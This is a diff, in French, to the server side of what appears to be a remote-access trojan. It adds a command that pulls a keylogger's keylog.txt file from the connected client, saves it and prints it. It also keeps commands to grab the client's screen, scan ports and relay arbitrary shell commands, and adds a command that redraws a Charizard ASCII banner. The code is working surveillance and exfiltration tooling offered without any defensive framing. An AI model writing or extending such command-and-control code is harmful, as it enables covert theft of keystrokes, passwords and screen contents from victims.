@@ -16,7 +16,6 @@ def afficher_ascii_art(filepath):
         with open(filepath, "r", encoding="utf-8") as file:
             print("\n" + "=" * 80)
             for line in file:
-                # Supposons que la frontière entre les formes est à la moitié de la ligne
                 middle_index = len(line) // 2
                 left_part = (line[:middle_index]
                              .replace('+', '\033[31m+\033[0m')
@@ -34,7 +33,6 @@ def afficher_ascii_art(filepath):
                               .replace('=', '\033[35m=\033[0m')
                               .replace('*', '\033[35m*\033[0m')
                               .replace('@', '\033[30m@\033[0m'))
-                # Affichage progressif de la ligne
                 print(left_part + right_part, end='', flush=True)
                 time.sleep(0.1)  # Délai rapide entre les lignes
             print("\n" + "=" * 80)
@@ -44,16 +42,16 @@ def afficher_ascii_art(filepath):
         print(f"Erreur lors de la lecture de l'art ASCII : {e}")
 
 def handle_connection(connection, address):
-    # Affiche l'ASCII art lorsqu'une connexion est établie
     afficher_ascii_art("dracaufeu.txt")
     print(f"Connexion établie avec {address}")
 
     help_text = """
         Commandes disponibles:
         - exit : Ferme la connexion avec le client.
-        - keylog : Affiche les frappes enregistrées par le keylogger.
+        - keylog : Récupère le fichier keylog.txt depuis le client, l'affiche dans la console et le sauvegarde.
         - screenshot : Prend une capture d'écran du client et l'enregistre sous le nom 'screen.png'.
         - scan <start_port> <end_port> : Effectue un scan des ports dans la plage spécifiée.
+        - pop_ascii : Régénère et affiche l'ASCII art.
         - help : Affiche cette aide.
         """
 
@@ -71,10 +69,28 @@ def handle_connection(connection, address):
 
             elif command.lower() == 'keylog':
                 try:
-                    with open(keylog_file, "r") as keylog:
-                        print(f"Contenu du Keylogger :\n{keylog.read()}")
-                except FileNotFoundError:
-                    print("Aucun fichier keylog trouvé.")
+                    connection.send(command.encode())  # Envoie la commande au client
+
+                    # Recevoir la taille du fichier keylog.txt
+                    file_size = int(connection.recv(1024).decode())
+                    connection.send(b'OK')  # Accusé de réception
+
+                    # Recevoir le contenu du fichier
+                    keylog_data = b""
+                    while len(keylog_data) < file_size:
+                        packet = connection.recv(4096)
+                        if not packet:
+                            break
+                        keylog_data += packet
+
+                    # Sauvegarder le fichier sur le serveur
+                    with open(keylog_file, "wb") as f:
+                        f.write(keylog_data)
+
+                    print(f"Le fichier keylog.txt a été sauvegardé dans le répertoire du serveur. Contenu :\n")
+                    print(keylog_data.decode())
+                except Exception as e:
+                    print(f"Erreur lors de la réception du fichier keylog : {e}")
 
             elif command.lower() == 'screenshot':
                 connection.send(command.encode())
@@ -98,9 +114,12 @@ def handle_connection(connection, address):
                 print(f"Résultat du scan :\n{response}")
                 continue
 
+            elif command.lower() == 'pop_ascii':
+                afficher_ascii_art("dracaufeu.txt")
+                continue
+
             else:
                 connection.send(command.encode())
-
                 response = connection.recv(4096).decode()
                 if not response:
                     break
